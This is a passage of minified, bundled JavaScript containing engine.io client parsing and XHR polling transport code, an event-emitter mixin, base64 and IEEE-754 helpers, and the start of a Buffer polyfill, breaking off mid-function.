!function() {
  function $parcel$export(e, n, v, s) {
    Object.defineProperty(e, n, {
      get: v,
      set: s,
      enumerable: !0,
      configurable: !0
    });
  }
  const $264e8d53b8281fac$export$c169aefb7330cccb = Object.create(null);
  $264e8d53b8281fac$export$c169aefb7330cccb.open = "0", $264e8d53b8281fac$export$c169aefb7330cccb.close = "1", 
  $264e8d53b8281fac$export$c169aefb7330cccb.ping = "2", $264e8d53b8281fac$export$c169aefb7330cccb.pong = "3", 
  $264e8d53b8281fac$export$c169aefb7330cccb.message = "4", $264e8d53b8281fac$export$c169aefb7330cccb.upgrade = "5", 
  $264e8d53b8281fac$export$c169aefb7330cccb.noop = "6";
  const $264e8d53b8281fac$export$47791e8004edd485 = Object.create(null);
  Object.keys($264e8d53b8281fac$export$c169aefb7330cccb).forEach((key => {
    $264e8d53b8281fac$export$47791e8004edd485[$264e8d53b8281fac$export$c169aefb7330cccb[key]] = key;
  }));
  const $264e8d53b8281fac$export$c718b5840781f8a7 = {
    type: "error",
    data: "parser error"
  }, $500775d3b617309f$var$withNativeBlob = "function" == typeof Blob || "undefined" != typeof Blob && "[object BlobConstructor]" === Object.prototype.toString.call(Blob), $500775d3b617309f$var$withNativeArrayBuffer = "function" == typeof ArrayBuffer, $500775d3b617309f$var$isView = obj => "function" == typeof ArrayBuffer.isView ? ArrayBuffer.isView(obj) : obj && obj.buffer instanceof ArrayBuffer, $500775d3b617309f$export$57852049361a8e62 = ({type: type, data: data}, supportsBinary, callback) => $500775d3b617309f$var$withNativeBlob && data instanceof Blob ? supportsBinary ? callback(data) : $500775d3b617309f$var$encodeBlobAsBase64(data, callback) : $500775d3b617309f$var$withNativeArrayBuffer && (data instanceof ArrayBuffer || $500775d3b617309f$var$isView(data)) ? supportsBinary ? callback(data) : $500775d3b617309f$var$encodeBlobAsBase64(new Blob([ data ]), callback) : callback($264e8d53b8281fac$export$c169aefb7330cccb[type] + (data || "")), $500775d3b617309f$var$encodeBlobAsBase64 = (data, callback) => {
    const fileReader = new FileReader;
    return fileReader.onload = function() {
      const content = fileReader.result.split(",")[1];
      callback("b" + (content || ""));
    }, fileReader.readAsDataURL(data);
  };
  function $500775d3b617309f$var$toArray(data) {
    return data instanceof Uint8Array ? data : data instanceof ArrayBuffer ? new Uint8Array(data) : new Uint8Array(data.buffer, data.byteOffset, data.byteLength);
  }
  let $500775d3b617309f$var$TEXT_ENCODER;
  function $500775d3b617309f$export$ec0c9b9013ee0ef5(packet, callback) {
    return $500775d3b617309f$var$withNativeBlob && packet.data instanceof Blob ? packet.data.arrayBuffer().then($500775d3b617309f$var$toArray).then(callback) : $500775d3b617309f$var$withNativeArrayBuffer && (packet.data instanceof ArrayBuffer || $500775d3b617309f$var$isView(packet.data)) ? callback($500775d3b617309f$var$toArray(packet.data)) : void $500775d3b617309f$export$57852049361a8e62(packet, !1, (encoded => {
      $500775d3b617309f$var$TEXT_ENCODER || ($500775d3b617309f$var$TEXT_ENCODER = new TextEncoder), 
      callback($500775d3b617309f$var$TEXT_ENCODER.encode(encoded));
    }));
  }
  const $721f55dcf904b035$var$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", $721f55dcf904b035$var$lookup = "undefined" == typeof Uint8Array ? [] : new Uint8Array(256);
  for (let i = 0; i < 64; i++) $721f55dcf904b035$var$lookup[$721f55dcf904b035$var$chars.charCodeAt(i)] = i;
  const $721f55dcf904b035$export$2f872c0f2117be69 = base64 => {
    let i2, encoded1, encoded2, encoded3, encoded4, bufferLength = .75 * base64.length, len = base64.length, p = 0;
    "=" === base64[base64.length - 1] && (bufferLength--, "=" === base64[base64.length - 2] && bufferLength--);
    const arraybuffer = new ArrayBuffer(bufferLength), bytes = new Uint8Array(arraybuffer);
    for (i2 = 0; i2 < len; i2 += 4) encoded1 = $721f55dcf904b035$var$lookup[base64.charCodeAt(i2)], 
    encoded2 = $721f55dcf904b035$var$lookup[base64.charCodeAt(i2 + 1)], encoded3 = $721f55dcf904b035$var$lookup[base64.charCodeAt(i2 + 2)], 
    encoded4 = $721f55dcf904b035$var$lookup[base64.charCodeAt(i2 + 3)], bytes[p++] = encoded1 << 2 | encoded2 >> 4, 
    bytes[p++] = (15 & encoded2) << 4 | encoded3 >> 2, bytes[p++] = (3 & encoded3) << 6 | 63 & encoded4;
    return arraybuffer;
  }, $72c5884de314f732$var$withNativeArrayBuffer = "function" == typeof ArrayBuffer, $72c5884de314f732$export$4647901878f33f31 = (encodedPacket, binaryType) => {
    if ("string" != typeof encodedPacket) return {
      type: "message",
      data: $72c5884de314f732$var$mapBinary(encodedPacket, binaryType)
    };
    const type = encodedPacket.charAt(0);
    if ("b" === type) return {
      type: "message",
      data: $72c5884de314f732$var$decodeBase64Packet(encodedPacket.substring(1), binaryType)
    };
    return $264e8d53b8281fac$export$47791e8004edd485[type] ? encodedPacket.length > 1 ? {
      type: $264e8d53b8281fac$export$47791e8004edd485[type],
      data: encodedPacket.substring(1)
    } : {
      type: $264e8d53b8281fac$export$47791e8004edd485[type]
    } : $264e8d53b8281fac$export$c718b5840781f8a7;
  }, $72c5884de314f732$var$decodeBase64Packet = (data, binaryType) => {
    if ($72c5884de314f732$var$withNativeArrayBuffer) {
      const decoded = $721f55dcf904b035$export$2f872c0f2117be69(data);
      return $72c5884de314f732$var$mapBinary(decoded, binaryType);
    }
    return {
      base64: !0,
      data: data
    };
  }, $72c5884de314f732$var$mapBinary = (data, binaryType) => "blob" === binaryType ? data instanceof Blob ? data : new Blob([ data ]) : data instanceof ArrayBuffer ? data : data.buffer, $4f8df83d8722cdb7$var$SEPARATOR = String.fromCharCode(30), $4f8df83d8722cdb7$export$144d64fe58dad441 = (packets, callback) => {
    const length = packets.length, encodedPackets = new Array(length);
    let count = 0;
    packets.forEach(((packet, i) => {
      $500775d3b617309f$export$57852049361a8e62(packet, !1, (encodedPacket => {
        encodedPackets[i] = encodedPacket, ++count === length && callback(encodedPackets.join($4f8df83d8722cdb7$var$SEPARATOR));
      }));
    }));
  }, $4f8df83d8722cdb7$export$d10cc2e7f7566a2d = (encodedPayload, binaryType) => {
    const encodedPackets = encodedPayload.split($4f8df83d8722cdb7$var$SEPARATOR), packets = [];
    for (let i = 0; i < encodedPackets.length; i++) {
      const decodedPacket = $72c5884de314f732$export$4647901878f33f31(encodedPackets[i], binaryType);
      if (packets.push(decodedPacket), "error" === decodedPacket.type) break;
    }
    return packets;
  };
  function $4f8df83d8722cdb7$export$a525fb718e9c623a() {
    return new TransformStream({
      transform(packet, controller) {
        $500775d3b617309f$export$ec0c9b9013ee0ef5(packet, (encodedPacket => {
          const payloadLength = encodedPacket.length;
          let header;
          if (payloadLength < 126) header = new Uint8Array(1), new DataView(header.buffer).setUint8(0, payloadLength); else if (payloadLength < 65536) {
            header = new Uint8Array(3);
            const view = new DataView(header.buffer);
            view.setUint8(0, 126), view.setUint16(1, payloadLength);
          } else {
            header = new Uint8Array(9);
            const view = new DataView(header.buffer);
            view.setUint8(0, 127), view.setBigUint64(1, BigInt(payloadLength));
          }
          packet.data && "string" != typeof packet.data && (header[0] |= 128), controller.enqueue(header), 
          controller.enqueue(encodedPacket);
        }));
      }
    });
  }
  let $4f8df83d8722cdb7$var$TEXT_DECODER;
  function $4f8df83d8722cdb7$var$totalLength(chunks) {
    return chunks.reduce(((acc, chunk) => acc + chunk.length), 0);
  }
  function $4f8df83d8722cdb7$var$concatChunks(chunks, size) {
    if (chunks[0].length === size) return chunks.shift();
    const buffer = new Uint8Array(size);
    let j = 0;
    for (let i = 0; i < size; i++) buffer[i] = chunks[0][j++], j === chunks[0].length && (chunks.shift(), 
    j = 0);
    return chunks.length && j < chunks[0].length && (chunks[0] = chunks[0].slice(j)), 
    buffer;
  }
  function $4f8df83d8722cdb7$export$552d20aac7500f47(maxPayload, binaryType) {
    $4f8df83d8722cdb7$var$TEXT_DECODER || ($4f8df83d8722cdb7$var$TEXT_DECODER = new TextDecoder);
    const chunks = [];
    let state = 0, expectedLength = -1, isBinary = !1;
    return new TransformStream({
      transform(chunk, controller) {
        for (chunks.push(chunk); ;) {
          if (0 === state) {
            if ($4f8df83d8722cdb7$var$totalLength(chunks) < 1) break;
            const header = $4f8df83d8722cdb7$var$concatChunks(chunks, 1);
            isBinary = 128 == (128 & header[0]), expectedLength = 127 & header[0], state = expectedLength < 126 ? 3 : 126 === expectedLength ? 1 : 2;
          } else if (1 === state) {
            if ($4f8df83d8722cdb7$var$totalLength(chunks) < 2) break;
            const headerArray = $4f8df83d8722cdb7$var$concatChunks(chunks, 2);
            expectedLength = new DataView(headerArray.buffer, headerArray.byteOffset, headerArray.length).getUint16(0), 
            state = 3;
          } else if (2 === state) {
            if ($4f8df83d8722cdb7$var$totalLength(chunks) < 8) break;
            const headerArray = $4f8df83d8722cdb7$var$concatChunks(chunks, 8), view = new DataView(headerArray.buffer, headerArray.byteOffset, headerArray.length), n = view.getUint32(0);
            if (n > Math.pow(2, 21) - 1) {
              controller.enqueue($264e8d53b8281fac$export$c718b5840781f8a7);
              break;
            }
            expectedLength = n * Math.pow(2, 32) + view.getUint32(4), state = 3;
          } else {
            if ($4f8df83d8722cdb7$var$totalLength(chunks) < expectedLength) break;
            const data = $4f8df83d8722cdb7$var$concatChunks(chunks, expectedLength);
            controller.enqueue($72c5884de314f732$export$4647901878f33f31(isBinary ? data : $4f8df83d8722cdb7$var$TEXT_DECODER.decode(data), binaryType)), 
            state = 0;
          }
          if (0 === expectedLength || expectedLength > maxPayload) {
            controller.enqueue($264e8d53b8281fac$export$c718b5840781f8a7);
            break;
          }
        }
      }
    });
  }
  function $2f158107a3ddb7c6$export$4293555f241ae35a(obj) {
    if (obj) return function(obj) {
      for (var key in $2f158107a3ddb7c6$export$4293555f241ae35a.prototype) obj[key] = $2f158107a3ddb7c6$export$4293555f241ae35a.prototype[key];
      return obj;
    }(obj);
  }
  $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.on = $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.addEventListener = function(event, fn) {
    return this._callbacks = this._callbacks || {}, (this._callbacks["$" + event] = this._callbacks["$" + event] || []).push(fn), 
    this;
  }, $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.once = function(event, fn) {
    function on() {
      this.off(event, on), fn.apply(this, arguments);
    }
    return on.fn = fn, this.on(event, on), this;
  }, $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.off = $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.removeListener = $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.removeAllListeners = $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.removeEventListener = function(event, fn) {
    if (this._callbacks = this._callbacks || {}, 0 == arguments.length) return this._callbacks = {}, 
    this;
    var cb, callbacks = this._callbacks["$" + event];
    if (!callbacks) return this;
    if (1 == arguments.length) return delete this._callbacks["$" + event], this;
    for (var i = 0; i < callbacks.length; i++) if ((cb = callbacks[i]) === fn || cb.fn === fn) {
      callbacks.splice(i, 1);
      break;
    }
    return 0 === callbacks.length && delete this._callbacks["$" + event], this;
  }, $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.emit = function(event) {
    this._callbacks = this._callbacks || {};
    for (var args = new Array(arguments.length - 1), callbacks = this._callbacks["$" + event], i = 1; i < arguments.length; i++) args[i - 1] = arguments[i];
    if (callbacks) {
      i = 0;
      for (var len = (callbacks = callbacks.slice(0)).length; i < len; ++i) callbacks[i].apply(this, args);
    }
    return this;
  }, $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.emitReserved = $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.emit, 
  $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.listeners = function(event) {
    return this._callbacks = this._callbacks || {}, this._callbacks["$" + event] || [];
  }, $2f158107a3ddb7c6$export$4293555f241ae35a.prototype.hasListeners = function(event) {
    return !!this.listeners(event).length;
  };
  const $2b2a396f70938061$export$394f9358f6231289 = "undefined" != typeof self ? self : "undefined" != typeof window ? window : Function("return this")();
  function $69315e998f85aa77$export$357523c63a2253b9(obj, ...attr) {
    return attr.reduce(((acc, k) => (obj.hasOwnProperty(k) && (acc[k] = obj[k]), acc)), {});
  }
  const $69315e998f85aa77$var$NATIVE_SET_TIMEOUT = $2b2a396f70938061$export$394f9358f6231289.setTimeout, $69315e998f85aa77$var$NATIVE_CLEAR_TIMEOUT = $2b2a396f70938061$export$394f9358f6231289.clearTimeout;
  function $69315e998f85aa77$export$2f67576668b97183(obj, opts) {
    opts.useNativeTimers ? (obj.setTimeoutFn = $69315e998f85aa77$var$NATIVE_SET_TIMEOUT.bind($2b2a396f70938061$export$394f9358f6231289), 
    obj.clearTimeoutFn = $69315e998f85aa77$var$NATIVE_CLEAR_TIMEOUT.bind($2b2a396f70938061$export$394f9358f6231289)) : (obj.setTimeoutFn = $2b2a396f70938061$export$394f9358f6231289.setTimeout.bind($2b2a396f70938061$export$394f9358f6231289), 
    obj.clearTimeoutFn = $2b2a396f70938061$export$394f9358f6231289.clearTimeout.bind($2b2a396f70938061$export$394f9358f6231289));
  }
  function $cb5520a7cfe6b222$export$c564cdbbe6da493(obj) {
    let str = "";
    for (let i in obj) obj.hasOwnProperty(i) && (str.length && (str += "&"), str += encodeURIComponent(i) + "=" + encodeURIComponent(obj[i]));
    return str;
  }
  function $cb5520a7cfe6b222$export$2f872c0f2117be69(qs) {
    let qry = {}, pairs = qs.split("&");
    for (let i = 0, l = pairs.length; i < l; i++) {
      let pair = pairs[i].split("=");
      qry[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
    }
    return qry;
  }
  class $46c7446dc2f9cd51$var$TransportError extends Error {
    constructor(reason, description, context) {
      super(reason), this.description = description, this.context = context, this.type = "TransportError";
    }
  }
  class $46c7446dc2f9cd51$export$86495b081fef8e52 extends $2f158107a3ddb7c6$export$4293555f241ae35a {
    constructor(opts) {
      super(), this.writable = !1, $69315e998f85aa77$export$2f67576668b97183(this, opts), 
      this.opts = opts, this.query = opts.query, this.socket = opts.socket;
    }
    onError(reason, description, context) {
      return super.emitReserved("error", new $46c7446dc2f9cd51$var$TransportError(reason, description, context)), 
      this;
    }
    open() {
      return this.readyState = "opening", this.doOpen(), this;
    }
    close() {
      return "opening" !== this.readyState && "open" !== this.readyState || (this.doClose(), 
      this.onClose()), this;
    }
    send(packets) {
      "open" === this.readyState && this.write(packets);
    }
    onOpen() {
      this.readyState = "open", this.writable = !0, super.emitReserved("open");
    }
    onData(data) {
      const packet = $72c5884de314f732$export$4647901878f33f31(data, this.socket.binaryType);
      this.onPacket(packet);
    }
    onPacket(packet) {
      super.emitReserved("packet", packet);
    }
    onClose(details) {
      this.readyState = "closed", super.emitReserved("close", details);
    }
    pause(onPause) {}
    createUri(schema, query = {}) {
      return schema + "://" + this._hostname() + this._port() + this.opts.path + this._query(query);
    }
    _hostname() {
      const hostname = this.opts.hostname;
      return -1 === hostname.indexOf(":") ? hostname : "[" + hostname + "]";
    }
    _port() {
      return this.opts.port && (this.opts.secure && Number(443 !== this.opts.port) || !this.opts.secure && 80 !== Number(this.opts.port)) ? ":" + this.opts.port : "";
    }
    _query(query) {
      const encodedQuery = $cb5520a7cfe6b222$export$c564cdbbe6da493(query);
      return encodedQuery.length ? "?" + encodedQuery : "";
    }
  }
  const $1afd8078cefa98bc$var$alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_".split(""), $1afd8078cefa98bc$var$length = 64, $1afd8078cefa98bc$var$map = {};
  let $1afd8078cefa98bc$var$prev, $1afd8078cefa98bc$var$seed = 0, $1afd8078cefa98bc$var$i = 0;
  function $1afd8078cefa98bc$export$c564cdbbe6da493(num) {
    let encoded = "";
    do {
      encoded = $1afd8078cefa98bc$var$alphabet[num % $1afd8078cefa98bc$var$length] + encoded, 
      num = Math.floor(num / $1afd8078cefa98bc$var$length);
    } while (num > 0);
    return encoded;
  }
  function $1afd8078cefa98bc$export$5bb64b92cb4135a() {
    const now = $1afd8078cefa98bc$export$c564cdbbe6da493(+new Date);
    return now !== $1afd8078cefa98bc$var$prev ? ($1afd8078cefa98bc$var$seed = 0, $1afd8078cefa98bc$var$prev = now) : now + "." + $1afd8078cefa98bc$export$c564cdbbe6da493($1afd8078cefa98bc$var$seed++);
  }
  for (;$1afd8078cefa98bc$var$i < $1afd8078cefa98bc$var$length; $1afd8078cefa98bc$var$i++) $1afd8078cefa98bc$var$map[$1afd8078cefa98bc$var$alphabet[$1afd8078cefa98bc$var$i]] = $1afd8078cefa98bc$var$i;
  let $cc88773d72fabc1d$var$value = !1;
  try {
    $cc88773d72fabc1d$var$value = "undefined" != typeof XMLHttpRequest && "withCredentials" in new XMLHttpRequest;
  } catch (err) {}
  const $cc88773d72fabc1d$export$5235bbd4a1ef06e = $cc88773d72fabc1d$var$value;
  function $339f95168c1ff58d$export$a2d42eb087c10497(opts) {
    const xdomain = opts.xdomain;
    try {
      if ("undefined" != typeof XMLHttpRequest && (!xdomain || $cc88773d72fabc1d$export$5235bbd4a1ef06e)) return new XMLHttpRequest;
    } catch (e) {}
    if (!xdomain) try {
      return new ($2b2a396f70938061$export$394f9358f6231289[[ "Active" ].concat("Object").join("X")])("Microsoft.XMLHTTP");
    } catch (e1) {}
  }
  function $b139188a56fa3540$var$empty() {}
  const $b139188a56fa3540$var$hasXHR2 = null != new $339f95168c1ff58d$export$a2d42eb087c10497({
    xdomain: !1
  }).responseType;
  class $b139188a56fa3540$export$7fa6c5b6f8193917 extends $2f158107a3ddb7c6$export$4293555f241ae35a {
    constructor(uri, opts) {
      super(), $69315e998f85aa77$export$2f67576668b97183(this, opts), this.opts = opts, 
      this.method = opts.method || "GET", this.uri = uri, this.data = void 0 !== opts.data ? opts.data : null, 
      this.create();
    }
    create() {
      var _a1;
      const opts = $69315e998f85aa77$export$357523c63a2253b9(this.opts, "agent", "pfx", "key", "passphrase", "cert", "ca", "ciphers", "rejectUnauthorized", "autoUnref");
      opts.xdomain = !!this.opts.xd;
      const xhr = this.xhr = new $339f95168c1ff58d$export$a2d42eb087c10497(opts);
      try {
        xhr.open(this.method, this.uri, !0);
        try {
          if (this.opts.extraHeaders) {
            xhr.setDisableHeaderCheck && xhr.setDisableHeaderCheck(!0);
            for (let i in this.opts.extraHeaders) this.opts.extraHeaders.hasOwnProperty(i) && xhr.setRequestHeader(i, this.opts.extraHeaders[i]);
          }
        } catch (e) {}
        if ("POST" === this.method) try {
          xhr.setRequestHeader("Content-type", "text/plain;charset=UTF-8");
        } catch (e1) {}
        try {
          xhr.setRequestHeader("Accept", "*/*");
        } catch (e2) {}
        null === (_a1 = this.opts.cookieJar) || void 0 === _a1 || _a1.addCookies(xhr), "withCredentials" in xhr && (xhr.withCredentials = this.opts.withCredentials), 
        this.opts.requestTimeout && (xhr.timeout = this.opts.requestTimeout), xhr.onreadystatechange = () => {
          var _a;
          3 === xhr.readyState && (null === (_a = this.opts.cookieJar) || void 0 === _a || _a.parseCookies(xhr)), 
          4 === xhr.readyState && (200 === xhr.status || 1223 === xhr.status ? this.onLoad() : this.setTimeoutFn((() => {
            this.onError("number" == typeof xhr.status ? xhr.status : 0);
          }), 0));
        }, xhr.send(this.data);
      } catch (e) {
        return void this.setTimeoutFn((() => {
          this.onError(e);
        }), 0);
      }
      "undefined" != typeof document && (this.index = $b139188a56fa3540$export$7fa6c5b6f8193917.requestsCount++, 
      $b139188a56fa3540$export$7fa6c5b6f8193917.requests[this.index] = this);
    }
    onError(err) {
      this.emitReserved("error", err, this.xhr), this.cleanup(!0);
    }
    cleanup(fromError) {
      if (void 0 !== this.xhr && null !== this.xhr) {
        if (this.xhr.onreadystatechange = $b139188a56fa3540$var$empty, fromError) try {
          this.xhr.abort();
        } catch (e) {}
        "undefined" != typeof document && delete $b139188a56fa3540$export$7fa6c5b6f8193917.requests[this.index], 
        this.xhr = null;
      }
    }
    onLoad() {
      const data = this.xhr.responseText;
      null !== data && (this.emitReserved("data", data), this.emitReserved("success"), 
      this.cleanup());
    }
    abort() {
      this.cleanup();
    }
  }
  if ($b139188a56fa3540$export$7fa6c5b6f8193917.requestsCount = 0, $b139188a56fa3540$export$7fa6c5b6f8193917.requests = {}, 
  "undefined" != typeof document) if ("function" == typeof attachEvent) attachEvent("onunload", $b139188a56fa3540$var$unloadHandler); else if ("function" == typeof addEventListener) {
    addEventListener("onpagehide" in $2b2a396f70938061$export$394f9358f6231289 ? "pagehide" : "unload", $b139188a56fa3540$var$unloadHandler, !1);
  }
  function $b139188a56fa3540$var$unloadHandler() {
    for (let i in $b139188a56fa3540$export$7fa6c5b6f8193917.requests) $b139188a56fa3540$export$7fa6c5b6f8193917.requests.hasOwnProperty(i) && $b139188a56fa3540$export$7fa6c5b6f8193917.requests[i].abort();
  }
  const $7c89bb7728a1cd1b$export$bdd553fddd433dcb = "function" == typeof Promise && "function" == typeof Promise.resolve ? cb => Promise.resolve().then(cb) : (cb, setTimeoutFn) => setTimeoutFn(cb, 0), $7c89bb7728a1cd1b$export$3909fb301d3dc8c9 = $2b2a396f70938061$export$394f9358f6231289.WebSocket || $2b2a396f70938061$export$394f9358f6231289.MozWebSocket;
  var $604506cec089c996$export$d622b2ad8d90c771, $604506cec089c996$export$6100ba28696e12de;
  $604506cec089c996$export$d622b2ad8d90c771 = function(b64) {
    var tmp, i1, lens = $604506cec089c996$var$getLens(b64), validLen = lens[0], placeHoldersLen = lens[1], arr = new $604506cec089c996$var$Arr(function(b64, validLen, placeHoldersLen) {
      return 3 * (validLen + placeHoldersLen) / 4 - placeHoldersLen;
    }(0, validLen, placeHoldersLen)), curByte = 0, len2 = placeHoldersLen > 0 ? validLen - 4 : validLen;
    for (i1 = 0; i1 < len2; i1 += 4) tmp = $604506cec089c996$var$revLookup[b64.charCodeAt(i1)] << 18 | $604506cec089c996$var$revLookup[b64.charCodeAt(i1 + 1)] << 12 | $604506cec089c996$var$revLookup[b64.charCodeAt(i1 + 2)] << 6 | $604506cec089c996$var$revLookup[b64.charCodeAt(i1 + 3)], 
    arr[curByte++] = tmp >> 16 & 255, arr[curByte++] = tmp >> 8 & 255, arr[curByte++] = 255 & tmp;
    2 === placeHoldersLen && (tmp = $604506cec089c996$var$revLookup[b64.charCodeAt(i1)] << 2 | $604506cec089c996$var$revLookup[b64.charCodeAt(i1 + 1)] >> 4, 
    arr[curByte++] = 255 & tmp);
    1 === placeHoldersLen && (tmp = $604506cec089c996$var$revLookup[b64.charCodeAt(i1)] << 10 | $604506cec089c996$var$revLookup[b64.charCodeAt(i1 + 1)] << 4 | $604506cec089c996$var$revLookup[b64.charCodeAt(i1 + 2)] >> 2, 
    arr[curByte++] = tmp >> 8 & 255, arr[curByte++] = 255 & tmp);
    return arr;
  }, $604506cec089c996$export$6100ba28696e12de = function(uint8) {
    for (var tmp, len3 = uint8.length, extraBytes = len3 % 3, parts = [], i3 = 0, len2 = len3 - extraBytes; i3 < len2; i3 += 16383) parts.push($604506cec089c996$var$encodeChunk(uint8, i3, i3 + 16383 > len2 ? len2 : i3 + 16383));
    1 === extraBytes ? (tmp = uint8[len3 - 1], parts.push($604506cec089c996$var$lookup[tmp >> 2] + $604506cec089c996$var$lookup[tmp << 4 & 63] + "==")) : 2 === extraBytes && (tmp = (uint8[len3 - 2] << 8) + uint8[len3 - 1], 
    parts.push($604506cec089c996$var$lookup[tmp >> 10] + $604506cec089c996$var$lookup[tmp >> 4 & 63] + $604506cec089c996$var$lookup[tmp << 2 & 63] + "="));
    return parts.join("");
  }
  /*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */;
  for (var $4f5fe54a600adeca$export$aafa59e2e03f2942, $4f5fe54a600adeca$export$68d8715fc104d294, $604506cec089c996$var$lookup = [], $604506cec089c996$var$revLookup = [], $604506cec089c996$var$Arr = "undefined" != typeof Uint8Array ? Uint8Array : Array, $604506cec089c996$var$code = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", $604506cec089c996$var$i = 0; $604506cec089c996$var$i < 64; ++$604506cec089c996$var$i) $604506cec089c996$var$lookup[$604506cec089c996$var$i] = $604506cec089c996$var$code[$604506cec089c996$var$i], 
  $604506cec089c996$var$revLookup[$604506cec089c996$var$code.charCodeAt($604506cec089c996$var$i)] = $604506cec089c996$var$i;
  function $604506cec089c996$var$getLens(b64) {
    var len1 = b64.length;
    if (len1 % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
    var validLen = b64.indexOf("=");
    return -1 === validLen && (validLen = len1), [ validLen, validLen === len1 ? 0 : 4 - validLen % 4 ];
  }
  function $604506cec089c996$var$encodeChunk(uint8, start, end) {
    for (var tmp, num, output = [], i2 = start; i2 < end; i2 += 3) tmp = (uint8[i2] << 16 & 16711680) + (uint8[i2 + 1] << 8 & 65280) + (255 & uint8[i2 + 2]), 
    output.push($604506cec089c996$var$lookup[(num = tmp) >> 18 & 63] + $604506cec089c996$var$lookup[num >> 12 & 63] + $604506cec089c996$var$lookup[num >> 6 & 63] + $604506cec089c996$var$lookup[63 & num]);
    return output.join("");
  }
  $604506cec089c996$var$revLookup["-".charCodeAt(0)] = 62, $604506cec089c996$var$revLookup["_".charCodeAt(0)] = 63, 
  $4f5fe54a600adeca$export$aafa59e2e03f2942 = function(buffer, offset, isLE, mLen, nBytes) {
    var e, m, eLen = 8 * nBytes - mLen - 1, eMax = (1 << eLen) - 1, eBias = eMax >> 1, nBits = -7, i = isLE ? nBytes - 1 : 0, d = isLE ? -1 : 1, s = buffer[offset + i];
    for (i += d, e = s & (1 << -nBits) - 1, s >>= -nBits, nBits += eLen; nBits > 0; e = 256 * e + buffer[offset + i], 
    i += d, nBits -= 8) ;
    for (m = e & (1 << -nBits) - 1, e >>= -nBits, nBits += mLen; nBits > 0; m = 256 * m + buffer[offset + i], 
    i += d, nBits -= 8) ;
    if (0 === e) e = 1 - eBias; else {
      if (e === eMax) return m ? NaN : 1 / 0 * (s ? -1 : 1);
      m += Math.pow(2, mLen), e -= eBias;
    }
    return (s ? -1 : 1) * m * Math.pow(2, e - mLen);
  }, $4f5fe54a600adeca$export$68d8715fc104d294 = function(buffer, value, offset, isLE, mLen, nBytes) {
    var e, m, c, eLen = 8 * nBytes - mLen - 1, eMax = (1 << eLen) - 1, eBias = eMax >> 1, rt = 23 === mLen ? Math.pow(2, -24) - Math.pow(2, -77) : 0, i = isLE ? 0 : nBytes - 1, d = isLE ? 1 : -1, s = value < 0 || 0 === value && 1 / value < 0 ? 1 : 0;
    for (value = Math.abs(value), isNaN(value) || value === 1 / 0 ? (m = isNaN(value) ? 1 : 0, 
    e = eMax) : (e = Math.floor(Math.log(value) / Math.LN2), value * (c = Math.pow(2, -e)) < 1 && (e--, 
    c *= 2), (value += e + eBias >= 1 ? rt / c : rt * Math.pow(2, 1 - eBias)) * c >= 2 && (e++, 
    c /= 2), e + eBias >= eMax ? (m = 0, e = eMax) : e + eBias >= 1 ? (m = (value * c - 1) * Math.pow(2, mLen), 
    e += eBias) : (m = value * Math.pow(2, eBias - 1) * Math.pow(2, mLen), e = 0)); mLen >= 8; buffer[offset + i] = 255 & m, 
    i += d, m /= 256, mLen -= 8) ;
    for (e = e << mLen | m, eLen += mLen; eLen > 0; buffer[offset + i] = 255 & e, i += d, 
    e /= 256, eLen -= 8) ;
    buffer[offset + i - d] |= 128 * s;
  };
  const $88f34ecd95880360$var$customInspectSymbol = "function" == typeof Symbol && "function" == typeof Symbol.for ? Symbol.for("nodejs.util.inspect.custom") : null;
  const $88f34ecd95880360$var$K_MAX_LENGTH = 2147483647;
  function $88f34ecd95880360$var$createBuffer(length) {
    if (length > $88f34ecd95880360$var$K_MAX_LENGTH) throw new RangeError('The value "' + length + '" is invalid for option "size"');
    const buf = new Uint8Array(length);
    return Object.setPrototypeOf(buf, $88f34ecd95880360$var$Buffer.prototype), buf;
  }
  function $88f34ecd95880360$var$Buffer(arg, encodingOrOffset, length) {
    if ("number" == typeof arg) {
      if ("string" == typeof encodingOrOffset) throw new TypeError('The "string" argument must be of type string. Received type number');
      return $88f34ecd95880360$var$allocUnsafe(arg);
    }
    return $88f34ecd95880360$var$from(arg, encodingOrOffset, length);
  }
  function $88f34ecd95880360$var$from(value, encodingOrOffset, length) {
    if ("string" == typeof value) return function(string, encoding) {
      "string" == typeof encoding && "" !== encoding || (encoding = "utf8");
      if (!$88f34ecd95880360$var$Buffer.isEncoding(encoding)) throw new TypeError("Unknown encoding: " + encoding);
      const length = 0 | $88f34ecd95880360$var$byteLength(string, encoding);
      let buf = $88f34ecd95880360$var$createBuffer(length);
      const actual = buf.write(string, encoding);
      actual !== length && (buf = buf.slice(0, actual));
      return buf;
    }(value, encodingOrOffset);
    if (ArrayBuffer.isView(value)) return function(arrayView) {
      if ($88f34ecd95880360$var$isInstance(arrayView, Uint8Array)) {
        const copy = new Uint8Array(arrayView);
        return $88f34ecd95880360$var$fromArrayBuffer(copy.buffer, copy.byteOffset, copy.byteLength);
      }
      return $88f34ecd95880360$var$fromArrayLike(arrayView);
    }(value);
    if (null == value) throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof value);
    if ($88f34ecd95880360$var$isInstance(value, ArrayBuffer) || value && $88f34ecd95880360$var$isInstance(value.buffer, ArrayBuffer)) return $88f34ecd95880360$var$fromArrayBuffer(value, encodingOrOffset, length);
    if ("undefined" != typeof SharedArrayBuffer && ($88f34ecd95880360$var$isInstance(value, SharedArrayBuffer) || value && $88f34ecd95880360$var$isInstance(value.buffer, SharedArrayBuffer))) return $88f34ecd95880360$var$fromArrayBuffer(value, encodingOrOffset, length);
